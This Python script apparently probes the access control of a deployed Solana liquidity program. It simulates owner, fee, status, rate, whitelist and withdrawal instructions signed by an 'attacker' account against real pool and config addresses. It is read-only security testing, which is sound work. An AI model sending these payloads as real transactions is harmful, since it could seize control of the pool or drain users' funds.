#!/usr/bin/env python3
"""Perena authority/permission tests: simulate privileged instructions with an
unprivileged attacker payer (sigVerify:false). Read-only."""
import json, hashlib, struct, base64, time
from rpc import call
from b58 import b58dec, b58enc
from sim import build_legacy, simulate

PID = "NUMERUNsFCP3kuNmWZuXtm1AaQCPj9uw6Guv2Ekoi5P"
TOKEN = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"
TOKEN22 = "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"
SYS = "11111111111111111111111111111111"
ATA = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL"
POOL = "2w4A1eGyjRutakyFdmVyBiLPf98qKxNTC2LpuwhaCruZ"
CFG = "FS159v4b2jo3fjGBaUFmDzgx7k616XhpKhMwX2Q3HeeD"
USDC = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"
USDT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB"
LP_MINT = "BenJy1n3WTx9mTjEvy63e8Q1j4RqUc6E4VBMz3ir4Wo6"  # USD* is also LP? check
# attacker
ATK = "8eBPJ5WnHHqf8tfHCPuV2TTATGimQ8hS7ab8guL348ed"
CFG_OWNER = "GSsMm5hzLueVXRmw4vovhGLqTvbrmzvkR95DdFKkj3Kg"  # from pool Arzx owner? read below

def disc(n): return hashlib.sha256(("global:"+n).encode()).digest()[:8]

def sim(accounts, writable, readonly, data, payer=ATK, extra=None):
    bh = call("getLatestBlockhash",[{"commitment":"processed"}])["value"]["blockhash"]
    ro = list(readonly)
    for a in accounts:
        if a != PID and a != payer and a not in writable and a not in ro:
            ro.append(a)
    ro = ro + [PID]
    tx = build_legacy(payer, [payer], writable, ro, bh, [(PID, accounts, data)])
    cfg = {}
    if extra: cfg["accounts"] = {"encoding":"base64","addresses":extra}
    return simulate(tx, cfg)

def report(tag, r):
    v = r["value"]; logs = v.get("logs") or []
    line = next((l for l in logs if "Error Code" in l or "failed:" in l or "success" in l.lower()), "")
    print(f"[{tag}] err={v.get('err')} cu={v.get('unitsConsumed')}")
    if line: print("     ", line.strip()[:170])

def main():
    # read config owner
    raw = base64.b64decode(call("getAccountInfo",[CFG,{"encoding":"base64"}])["value"]["data"][0])
    cfg_owner = b58enc(raw[8:40])
    cfg_status = struct.unpack_from("<I", raw, 40)[0]
    print("NumeraireConfig owner:", cfg_owner, "status:", cfg_status)

    # 1. set_owner(pool, payer) attacker
    report("set_owner pool->attacker", sim([POOL, ATK], [POOL], [], disc("set_owner")+b58dec(ATK)))
    time.sleep(0.2)
    # 2. set_status(pool, payer)
    report("set_status pool", sim([POOL, ATK], [POOL], [], disc("set_status")+struct.pack("<I",119)))
    time.sleep(0.2)
    # 3. set_fee(pool, payer)
    report("set_fee pool", sim([POOL, ATK], [POOL], [], disc("set_fee")+struct.pack("<II",9999,10000)))
    time.sleep(0.2)
    # 4. set_inv_t_max(pool, payer)
    report("set_inv_t_max pool", sim([POOL, ATK], [POOL], [], disc("set_inv_t_max")+struct.pack("<Q",2**63)))
    time.sleep(0.2)
    # 5. set_whitelisted_adder(pool, payer)
    report("set_whitelisted_adder", sim([POOL, ATK], [POOL], [], disc("set_whitelisted_adder")+b58dec(ATK)))
    time.sleep(0.2)
    # 6. set_rate(config, pair_mint, payer, sys)
    report("set_rate config", sim([CFG, USDC, ATK, SYS], [CFG], [SYS], disc("set_rate")+b58dec(USDC)+struct.pack("<II", 2,1)))
    time.sleep(0.2)
    # 7. set_numeraire_owner(config, pair_mint, payer, sys)
    report("set_numeraire_owner", sim([CFG, USDC, ATK, SYS], [CFG], [SYS], disc("set_numeraire_owner")+b58dec(ATK)))
    time.sleep(0.2)
    # 8. set_numeraire_status
    report("set_numeraire_status", sim([CFG, USDC, ATK, SYS], [CFG], [SYS], disc("set_numeraire_status")+struct.pack("<I",1)))
    time.sleep(0.2)
    # 9. set_numeraire_whitelisted_pool_creator
    report("set_numeraire_whitelisted_pool_creator", sim([CFG, USDC, ATK, SYS], [CFG], [SYS], disc("set_numeraire_whitelisted_pool_creator")+b58dec(ATK)))
    time.sleep(0.2)
    # 10. skim(pool, lp_mint, payer_lp_account, config, payer, tok, tok22)
    report("skim", sim([POOL, LP_MINT, ATK, CFG, ATK, TOKEN, TOKEN22], [POOL, ATK], [TOKEN, TOKEN22], b""))
    time.sleep(0.2)
    # 11. compound
    report("compound", sim([POOL, LP_MINT, ATK, CFG, ATK, TOKEN, TOKEN22], [POOL, ATK], [TOKEN, TOKEN22], b""))
    time.sleep(0.2)
    # 12. remove_all_liquidity
    report("remove_all_liquidity", sim([POOL, LP_MINT, ATK, CFG, ATK, TOKEN, TOKEN22], [POOL, ATK], [TOKEN, TOKEN22], b""))

if __name__ == "__main__":
    main()
